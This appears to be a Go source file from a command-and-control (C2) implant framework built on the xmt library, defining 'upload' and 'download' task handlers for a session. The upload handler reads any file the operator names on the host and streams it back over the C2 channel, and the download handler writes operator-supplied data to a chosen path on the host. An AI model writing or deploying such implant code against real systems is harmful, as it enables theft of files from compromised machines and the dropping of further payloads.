package c2

import (
	"io"
	"os"

	"github.com/iDigitalFlame/xmt/xmt/data"
	"github.com/iDigitalFlame/xmt/xmt/device"
)

type upload bool
type download bool

func (upload) Thread() bool {
	return true
}
func (download) Thread() bool {
	return true
}
func (upload) Execute(s *Session, r data.Reader, w data.Writer) error {
	p, err := r.StringVal()
	if err != nil {
		return err
	}
	v := device.Expand(p)
	f, err := os.OpenFile(v, os.O_RDONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	d, err := f.Stat()
	if err != nil {
		return err
	}
	if err := w.WriteString(v); err != nil {
		return err
	}
	if err := w.WriteInt64(d.Size()); err != nil {
		return err
	}
	if _, err := io.Copy(w, f); err != nil {
		return err
	}
	return nil
}
func (download) Execute(s *Session, r data.Reader, w data.Writer) error {
	p, err := r.StringVal()
	if err != nil {
		return err
	}
	v := device.Expand(p)
	f, err := os.Create(v)
	if err != nil {
		return err
	}
	defer f.Close()
	n, err := io.Copy(f, r)
	if err != nil {
		return err
	}
	if err := w.WriteString(v); err != nil {
		return err
	}
	if err := w.WriteInt64(n); err != nil {
		return err
	}
	return nil
}
